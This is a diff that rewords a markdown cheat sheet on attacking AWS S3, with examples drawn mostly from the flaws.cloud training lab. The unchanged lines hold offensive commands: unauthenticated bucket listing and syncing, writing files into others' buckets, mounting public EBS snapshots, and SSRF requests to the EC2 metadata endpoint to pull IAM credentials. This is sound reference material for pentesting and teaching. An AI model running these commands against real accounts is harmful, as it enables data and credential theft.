@@ -1,4 +1,4 @@
-# Amazon Bucket S3 AWS
+# AWS (Amazon Web Services) S3 Bucket
 
 ## Summary
 
@@ -15,14 +15,14 @@
 
 ## AWS Configuration
 
-Prerequisites, at least you need awscli
+Prerequisites, at least you need `awscli`
 
 ```bash
 sudo apt install awscli
 ```
 
-You can get your credential here https://console.aws.amazon.com/iam/home?#/security_credential
-but you need an aws account, free tier account : https://aws.amazon.com/s/dm/optimization/server-side-test/free-tier/free_np/
+You can get your credentials here https://console.aws.amazon.com/iam/home?#/security_credential
+but you need an AWS account, free tier account: https://aws.amazon.com/s/dm/optimization/server-side-test/free-tier/free_np/
 
 ```javascript
 aws configure
@@ -34,9 +34,9 @@ AWSSecretKey=[ENTER HERE YOUR KEY]
 aws configure --profile nameofprofile
 ```
 
-then you can use *--profile nameofprofile* in the aws command.
+Then, you can provide *--profile nameofprofile* to the `aws` command.
 
-Alternatively you can use environment variables instead of creating a profile.
+Alternatively, you can use environment variables instead of creating a profile.
 
 ```bash
 export AWS_ACCESS_KEY_ID=ASIAZ[...]PODP56
@@ -46,7 +46,7 @@ export AWS_SESSION_TOKEN=FQoGZXIvYXdzE[...]8aOK4QU=
 
 ## Open Bucket
 
-By default the name of Amazon Bucket are like http://s3.amazonaws.com/[bucket_name]/, you can browse open buckets if you know their names
+By default, the URI of an Amazon Bucket is http://s3.amazonaws.com/[bucket_name]/, you can browse open buckets if you know their names
 
 ```bash
 http://s3.amazonaws.com/[bucket_name]/
@@ -61,7 +61,8 @@ Their names are also listed if the listing is enabled.
 <Name>adobe-REDACTED-REDACTED-REDACTED</Name>
 ```
 
-Alternatively you can extract the name of inside-site s3 bucket with `%C0`. (Trick from https://twitter.com/0xmdv/status/1065581916437585920)
+Alternatively you can extract the name of the inside-site S3 bucket by appending `%C0` to the request path.
+(Trick from https://twitter.com/0xmdv/status/1065581916437585920)
 
 ```xml
 http://example.com/resources/id%C0
@@ -78,7 +79,7 @@ aws s3 ls s3://targetbucket --no-sign-request --region insert-region-here
 aws s3 ls s3://flaws.cloud/ --no-sign-request --region us-west-2
 ```
 
-You can get the region with a dig and nslookup
+You can get the region with `dig` and `nslookup`
 
 ```bash
 $ dig flaws.cloud
@@ -105,7 +106,7 @@ aws s3 mv test.txt s3://hackerone.files
 SUCCESS : "move: ./test.txt to s3://hackerone.files/test.txt"
 ```
 
-### Download every things
+### Download everything
 
 ```powershell
 aws s3 sync s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/ . --no-sign-request --region us-west-2
@@ -113,7 +114,7 @@ aws s3 sync s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/ . --no-sig
 
 ### Check bucket disk size
 
-Use `--no-sign` for un-authenticated check.
+Use `--no-sign` for an un-authenticated check.
 
 ```powershell
 aws s3 ls s3://<bucketname> --recursive  | grep -v -E "(Bucket: |Prefix: |LastWriteTime|^$|--)" | awk 'BEGIN {total=0}{total+=$3}END{print total/1024/1024" MB"}'
@@ -132,7 +133,7 @@ $ aws --profile flaws ec2 describe-snapshots --owner-id XXXX26262029 --region us
 
 Create a volume using snapshot
 $ aws --profile swk ec2 create-volume --availability-zone us-west-2a --region us-west-2  --snapshot-id  snap-XXXX342abd1bdcb89
-In Aws Console -> EC2 -> New Ubuntu
+In AWS Console -> EC2 -> New Ubuntu
 $ chmod 400 YOUR_KEY.pem
 $ ssh -i YOUR_KEY.pem  ubuntu@ec2-XXX-XXX-XXX-XXX.us-east-2.compute.amazonaws.com
 
@@ -144,7 +145,7 @@ $ sudo mount /dev/xvda1 /mnt
 
 ## Bucket juicy data
 
-Amazon exposes an internal service every EC2 instance can query for instance metadata about the host. If you found an SSRF vulnerability that runs on EC2, try requesting :
+Amazon exposes an internal service every EC2 instance can query for instance metadata about the host. If you found an SSRF vulnerability that runs on EC2, try requesting:
 
 ```powershell
 http://169.254.169.254/latest/meta-data/
@@ -153,7 +154,7 @@ http://169.254.169.254/latest/meta-data/iam/security-credentials/IAM_USER_ROLE_H
 http://169.254.169.254/latest/meta-data/iam/security-credentials/PhotonInstance
 ```
 
-For example with a proxy : http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws/
+For example, with a proxy: http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws/
 
 ## References
 
